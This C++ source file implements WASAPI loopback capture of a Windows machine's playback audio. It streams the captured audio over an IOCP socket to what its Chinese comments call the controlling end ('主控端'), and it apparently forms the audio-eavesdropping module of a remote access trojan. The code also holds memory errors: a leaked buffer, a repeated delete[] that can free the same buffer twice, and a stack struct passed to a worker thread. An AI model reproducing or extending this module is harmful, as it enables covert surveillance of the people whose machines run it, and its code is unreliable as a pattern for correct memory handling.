#include "pch.h"

#include "PlaybackAudioCapture.h"

////////////////////  CPlaybackCaptureImpl  /////////////////
struct capture_thread_data
{
	HANDLE hEventStarted;
	HANDLE hEventStop;
	CIOCPServer* ClientObjectsec;
	ClientContext* m_ContextObject;
	IMMDevice* pDevice;
};



//CClassRegister CPlaybackCaptureImpl::m_sClassRegister(AUDIO_CAPTURE_CLASS, AudioCaptureMessageProc);

BOOL AdjustFormatTo16Bits(WAVEFORMATEX* pwfx)
{
	BOOL bRet(FALSE);

	if (pwfx->wFormatTag == WAVE_FORMAT_IEEE_FLOAT)
	{
		pwfx->wFormatTag = WAVE_FORMAT_PCM;
		pwfx->wBitsPerSample = 16;
		pwfx->nBlockAlign = pwfx->nChannels * pwfx->wBitsPerSample / 8;
		pwfx->nAvgBytesPerSec = pwfx->nBlockAlign * pwfx->nSamplesPerSec;

		bRet = TRUE;
	}
	else if (pwfx->wFormatTag == WAVE_FORMAT_EXTENSIBLE)
	{
		PWAVEFORMATEXTENSIBLE pEx = reinterpret_cast<PWAVEFORMATEXTENSIBLE>(pwfx);
		if (IsEqualGUID(KSDATAFORMAT_SUBTYPE_IEEE_FLOAT, pEx->SubFormat))
		{
			pEx->SubFormat = KSDATAFORMAT_SUBTYPE_PCM;
			pEx->Samples.wValidBitsPerSample = 16;
			pwfx->wBitsPerSample = 16;
			pwfx->nBlockAlign = pwfx->nChannels * pwfx->wBitsPerSample / 8;
			pwfx->nAvgBytesPerSec = pwfx->nBlockAlign * pwfx->nSamplesPerSec;

			bRet = TRUE;
		}
	}

	return bRet;
}

UINT CaptureAudio(CIOCPServer* CIOCPServerobjectlast, ClientContext* m_ContextObjectlast,IMMDevice* pDevice, HANDLE hEventStarted, HANDLE hEventStop)
{
	HRESULT hr;
	IAudioClient* pAudioClient = NULL;
	WAVEFORMATEX* pwfx = NULL;
	REFERENCE_TIME hnsDefaultDevicePeriod(0);
	HANDLE hTimerWakeUp = NULL;
	IAudioCaptureClient* pAudioCaptureClient = NULL;
	DWORD nTaskIndex = 0;
	HANDLE hTask = NULL;
	BOOL bStarted(FALSE);
	do
	{
		hr = pDevice->Activate(__uuidof(IAudioClient), CLSCTX_ALL, NULL, (void**)&pAudioClient);
		if (FAILED(hr)) break;

		hr = pAudioClient->GetDevicePeriod(&hnsDefaultDevicePeriod, NULL);
		if (FAILED(hr)) break;

		hr = pAudioClient->GetMixFormat(&pwfx);
		if (FAILED(hr)) break;

		if (!AdjustFormatTo16Bits(pwfx)) break;

		hTimerWakeUp = CreateWaitableTimer(NULL, FALSE, NULL);
		if (hTimerWakeUp == NULL) break;

		SetEvent(hEventStarted);
		//////////
			//	NotifyWaveFormat(hWndMessage, pwfx);
		hr = pAudioClient->Initialize(AUDCLNT_SHAREMODE_SHARED, AUDCLNT_STREAMFLAGS_LOOPBACK, 0, 0, pwfx, 0);
		if (FAILED(hr)) break;

		hr = pAudioClient->GetService(__uuidof(IAudioCaptureClient), (void**)&pAudioCaptureClient);
		if (FAILED(hr)) break;

		hTask = AvSetMmThreadCharacteristics((char*)"Capture", &nTaskIndex);
		if (NULL == hTask) break;

		LARGE_INTEGER liFirstFire;
		liFirstFire.QuadPart = -hnsDefaultDevicePeriod / 2; // 负意味着相对时间
		LONG lTimeBetweenFires = (LONG)hnsDefaultDevicePeriod / 2 / (10 * 1000); // 转换为毫秒

		BOOL bOK = SetWaitableTimer(hTimerWakeUp, &liFirstFire, lTimeBetweenFires, NULL, NULL, FALSE);
		if (!bOK) break;

		hr = pAudioClient->Start();
		if (FAILED(hr)) break;
		//////////////////
			//	NotifyStatus(hWndMessage, CAPTURE_START, lTimeBetweenFires);
		bStarted = TRUE;

		HANDLE waitArray[2] = { hEventStop, hTimerWakeUp };
		DWORD dwWaitResult;
		UINT32 nNextPacketSize(0);
		BYTE* pData = NULL;
		UINT32 nNumFramesToRead;
		DWORD dwFlags;
		LPBYTE senddate = new BYTE[5000];
		WORD sendsize = 0;
		int num = 0;
		//ofstream outFile("students.dat", ios::out | ios::binary);
		while (TRUE)
		{
			dwWaitResult = WaitForMultipleObjects(sizeof(waitArray) / sizeof(waitArray[0]), waitArray, FALSE, INFINITE);
			if (WAIT_OBJECT_0 == dwWaitResult) break;

			if (WAIT_OBJECT_0 + 1 != dwWaitResult)
			{///////////////
			//	NotifyStatus(hWndMessage, CAPTURE_ERROR);
				break;
			}

			hr = pAudioCaptureClient->GetNextPacketSize(&nNextPacketSize);
			if (FAILED(hr))
			{///////////////
			//	NotifyStatus(hWndMessage, CAPTURE_ERROR);
				break;
			}

			if (nNextPacketSize == 0) continue;

			hr = pAudioCaptureClient->GetBuffer(
				&pData,
				&nNumFramesToRead,
				&dwFlags,
				NULL,
				NULL
			);
			if (FAILED(hr))
			{/////////////////
			//	NotifyStatus(hWndMessage, CAPTURE_ERROR);
				break;
			}

			if (0 != nNumFramesToRead)
			{////////////////
				//outFile.write((char*)pData, nNumFramesToRead * pwfx->nBlockAlign);
				//NotifyData(hWndMessage, pData, nNumFramesToRead * pwfx->nBlockAlign);

				//int	dwBufferSize = nNumFramesToRead * pwfx->nBlockAlign;
				//LPBYTE szPacket=new BYTE[dwBufferSize+1];
				////加入数据头
				//szPacket[0] = TOKEN_AUDIO_DATA;     //向主控端发送该消息
				////复制缓冲区
				//memcpy(szPacket + 1, pData, dwBufferSize);
				//szPacket[dwBufferSize] = 0;
				////发送出去
				//if (dwBufferSize > 0)
				//{
				//	CPlaybackCaptureImpl::ClientObjectsec->Send((LPBYTE)szPacket, dwBufferSize + 1);
				//}
				num++;
				//memcpy(senddate, pData, nNumFramesToRead * pwfx->nBlockAlign);
				senddate = new BYTE[nNumFramesToRead * pwfx->nBlockAlign + 1];
				senddate[0] = TOKEN_SPEAK_DATA;     //向主控端发送该消息
//复制缓冲区
				memcpy(senddate + 1, pData, nNumFramesToRead * pwfx->nBlockAlign);
				CIOCPServerobjectlast->Send(m_ContextObjectlast,(LPBYTE)senddate, nNumFramesToRead * pwfx->nBlockAlign + 1);
			
				
			}

			pAudioCaptureClient->ReleaseBuffer(nNumFramesToRead);
			delete[]senddate;
		}
	
	} while (FALSE);


	if (hTask != NULL)
	{
		AvRevertMmThreadCharacteristics(hTask);
		hTask = NULL;
	}

	if (pAudioCaptureClient != NULL)
	{
		pAudioCaptureClient->Release();
		pAudioCaptureClient = NULL;
	}

	if (pwfx != NULL)
	{
		CoTaskMemFree(pwfx);
		pwfx = NULL;
	}

	if (hTimerWakeUp != NULL)
	{
		CancelWaitableTimer(hTimerWakeUp);
		CloseHandle(hTimerWakeUp);
		hTimerWakeUp = NULL;
	}

	if (pAudioClient != NULL)
	{
		if (bStarted)
		{
			pAudioClient->Stop();
			//NotifyStatus(hWndMessage, CAPTURE_STOP);
		}

		pAudioClient->Release();
		pAudioClient = NULL;
	}

	return 0;
}

UINT __stdcall CaptureTheadProc(LPVOID param)
{
	CoInitialize(NULL);

	capture_thread_data* pData = (capture_thread_data*)param;
	CIOCPServer* ClientObjectsectemp = pData->ClientObjectsec;
	HANDLE hEventStop = pData->hEventStop;
	IMMDevice* pDevice = pData->pDevice;
	HANDLE hEventStarted = pData->hEventStarted;
	ClientContext* m_ContextObjecttemp= pData->m_ContextObject;

	UINT nRet = CaptureAudio(ClientObjectsectemp, m_ContextObjecttemp, pDevice, hEventStarted, hEventStop);

	CoUninitialize();

	return nRet;
}

CPlaybackCaptureImpl::CPlaybackCaptureImpl() :m_hThreadCapture(NULL), m_bInited(FALSE), m_pDevice(NULL),
m_hEventStarted(NULL), m_hEventStop(NULL)
{

}

CPlaybackCaptureImpl::~CPlaybackCaptureImpl()
{
	if (m_bInited) Destroy();
}

VOID CPlaybackCaptureImpl::OnThreadEnd()
{
	if (m_hThreadCapture != NULL)
	{
		CloseHandle(m_hThreadCapture);
		m_hThreadCapture = NULL;
	}
}

IMMDevice* CPlaybackCaptureImpl::GetDefaultDevice()
{
	IMMDevice* pDevice = NULL;
	IMMDeviceEnumerator* pMMDeviceEnumerator = NULL;
	HRESULT hr = CoCreateInstance(
		__uuidof(MMDeviceEnumerator), NULL, CLSCTX_ALL,
		__uuidof(IMMDeviceEnumerator),
		(void**)&pMMDeviceEnumerator);
	if (FAILED(hr)) return NULL;

	hr = pMMDeviceEnumerator->GetDefaultAudioEndpoint(eRender, eConsole, &pDevice);
	pMMDeviceEnumerator->Release();

	return pDevice;
}

BOOL CPlaybackCaptureImpl::Initialize(CIOCPServer* ClientObject,	ClientContext* m_ContextObject)
{
	if (m_bInited) return TRUE;
	CIOCPServerobjext = ClientObject;
	//m_pEventHandler = pHandler;
	ClientContextobject = m_ContextObject;
	do
	{
		m_pDevice = GetDefaultDevice();
		if (m_pDevice == NULL) break;

		m_hEventStop = CreateEvent(NULL, TRUE, FALSE, NULL);
		if (m_hEventStop == NULL) break;

		m_hEventStarted = CreateEvent(NULL, TRUE, FALSE, NULL);
		if (m_hEventStarted == NULL) break;

		m_bInited = TRUE;

	} while (FALSE);

	if (!m_bInited)
	{
		Destroy();
	}

	return m_bInited;
}

VOID CPlaybackCaptureImpl::Destroy()
{
	if (m_hWndMessage != NULL
		&& ::IsWindow(m_hWndMessage))
	{
		DestroyWindow(m_hWndMessage);
	}

	m_hWndMessage = NULL;

	if (m_pDevice != NULL)
	{
		m_pDevice->Release();
		m_pDevice = NULL;
	}

	if (m_hEventStop != NULL)
	{
		CloseHandle(m_hEventStop);
		m_hEventStop = NULL;
	}

	if (m_hEventStarted != NULL)
	{
		CloseHandle(m_hEventStarted);
		m_hEventStarted = NULL;
	}

	m_bInited = FALSE;
}

BOOL CPlaybackCaptureImpl::IsInited() const
{
	return m_bInited;
}

BOOL CPlaybackCaptureImpl::IsCapturing() const
{
	return m_hThreadCapture != NULL;
}

BOOL CPlaybackCaptureImpl::Start()
{
	if (!m_bInited) return FALSE;
	if (m_hThreadCapture != NULL) return TRUE;

	capture_thread_data data;
	data.hEventStop = m_hEventStop;
	data.ClientObjectsec = CIOCPServerobjext;
	data.pDevice = m_pDevice;
	data.hEventStarted = m_hEventStarted;
	data.m_ContextObject = ClientContextobject;
	m_hThreadCapture = (HANDLE)_beginthreadex(NULL, 0, &CaptureTheadProc, &data, 0, NULL);
	if (m_hThreadCapture == NULL) return FALSE;

	HANDLE arWaits[2] = { m_hEventStarted, m_hThreadCapture };
	DWORD dwWaitResult = WaitForMultipleObjects(sizeof(arWaits) / sizeof(arWaits[0]), arWaits, FALSE, INFINITE);
	if (dwWaitResult != WAIT_OBJECT_0)
	{
		Stop();
		return FALSE;
	}

	return TRUE;
}

VOID CPlaybackCaptureImpl::Stop()
{
	

	if (!m_bInited) return;

	if (m_hEventStop != NULL
		&& m_hThreadCapture != NULL)
	{
		SetEvent(m_hEventStop);
		OnThreadEnd();
	}
}

////////////////////  CPlaybackCaptureImpl  /////////////////

